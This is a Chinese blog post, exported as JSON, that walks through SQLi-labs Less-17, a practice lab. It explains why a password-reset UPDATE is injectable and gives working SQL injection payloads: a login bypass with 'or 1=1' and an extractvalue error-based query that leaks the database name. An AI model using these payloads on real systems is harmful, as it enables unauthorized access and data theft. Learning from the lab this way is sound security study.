{"title":"POST注入--基于Password的注入","uid":"9ed0d530657a494b586000f6c049b35e","slug":"POST注入-基于Password的注入","date":"2022-02-05T05:45:34.000Z","updated":"2022-02-13T15:41:34.276Z","comments":true,"path":"api/articles/POST注入-基于Password的注入.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>[TOC]</p>\n<h2 id=\"Less-17\"><a href=\"#Less-17\" class=\"headerlink\" title=\"Less-17\"></a>Less-17</h2><p>说实话，看到的时候挺吃惊的，没见过，试了很多payload，都注不进去，它还嘲讽我：</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220205134905162.png\" alt=\"image-20220205134905162\"></p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p>查了一下资料，又看了一下源码发现<code>username</code>已经不能被注入了，原因是源码将<code>uname</code>字段进行了检查，导致<code>uname</code>不能够构造payload进行注入。</p>\n<p>（check_input()中，对 username 进行各种转义的处理）</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220205135439584.png\" alt=\"image-20220205135439584\"></p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220205135454717.png\" alt=\"image-20220205135454717\"></p>\n<p>源码当中还遇到<code>update</code>进行了密码更新，以至于<code>passwd</code>字段可以进行构造payload：</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220205140047399.png\" alt=\"image-20220205140047399\"></p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>而执行以下语句时报错：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin  &amp;passwd&#x3D;1&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220205140447561.png\" alt=\"image-20220205140447561\"></p>\n<p>探测注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin  &amp;passwd&#x3D;1&#39; or 1&#x3D;1 #<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>登录成功。</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220205140542450.png\" alt=\"image-20220205140542450\"></p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>在passwd处构造payload进行报错注入：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uname&#x3D;admin  &amp;passwd&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) #<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220205140826696.png\" alt=\"image-20220205140826696\"></p>\n<p>其他payload类似。</p>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>这里还需要注意其他几个函数：</p>\n<p>1、增加一行数据：<strong>Insert</strong></p>\n<p>例：insert into users values(‘15’,’xiaobai’,’xiaobai’);</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220205142153374.png\" alt=\"image-20220205142153374\"></p>\n<p>2、<strong>delete</strong>：</p>\n<p>删除：</p>\n<p>删数据: </p>\n<p>delete from 表名; </p>\n<p>delete from 表名 where id&#x3D;1; </p>\n<p>删除结构： </p>\n<p>删数据库：drop database 数据库名; </p>\n<p>删除表：drop table 表名; </p>\n<p>删除表中的列:alter table 表名 drop column列名;</p>\n<p>例：delete from users where id&#x3D;15；</p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220205142551573.png\" alt=\"image-20220205142551573\"></p>\n<p><img src=\"/post/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220205142607603.png\" alt=\"image-20220205142607603\"></p>\n<p>3、<strong>update</strong>：修改</p>\n<p>修改所有：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ ;</p>\n<p>带条件的修改：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ where id&#x3D;6</p>\n<p>例：update users set username&#x3D;’tt’ where id&#x3D;15;</p>\n","text":"[TOC] Less-17说实话，看到的时候挺吃惊的，没见过，试了很多payload，都注不进去，它还嘲讽我： 0x01查了一下资料，又看了一下源码发现username已经不能被注入了，原因是源码将uname字段进行了检查，导致uname不能够构造payload进行注入。 （ch...","link":"","photos":[],"count_time":{"symbolsCount":962,"symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-17\"><span class=\"toc-text\">Less-17</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"POST注入-HTTP头注入","uid":"8d3782033a7b54632cfb455b67ca9836","slug":"POST注入-HTTP头注入","date":"2022-02-05T13:27:35.000Z","updated":"2022-02-13T15:31:36.278Z","comments":true,"path":"api/articles/POST注入-HTTP头注入.json","keywords":null,"cover":[],"text":"[TOC] 0x00原理：HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。 $_SERVER详解$_SERVER['SCRIPT_NAME'] //当前脚本的路径 dirname($_SERVER['SCRIPT_NAME'] //dirname() 返回路径中的目录...","link":"","photos":[],"count_time":{"symbolsCount":"5.7k","symbolsTime":"5 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"SQL注入-POST注入","uid":"32164fb6c436bfef89c97f001eea26bc","slug":"SQL注入-POST注入","date":"2022-02-05T01:25:13.000Z","updated":"2022-02-13T15:45:17.712Z","comments":true,"path":"api/articles/SQL注入-POST注入.json","keywords":null,"cover":[],"text":"[TOC] 0x00POST注入，就是数据从客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名 和密码以表单的形式提交， 提交到服务器后服务器再进行验证。这就是一次 post的过程。 Less-11当在输入框输入正确的用户名和密码后，显示登录成功 0x01接下...","link":"","photos":[],"count_time":{"symbolsCount":"2.8k","symbolsTime":"3 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}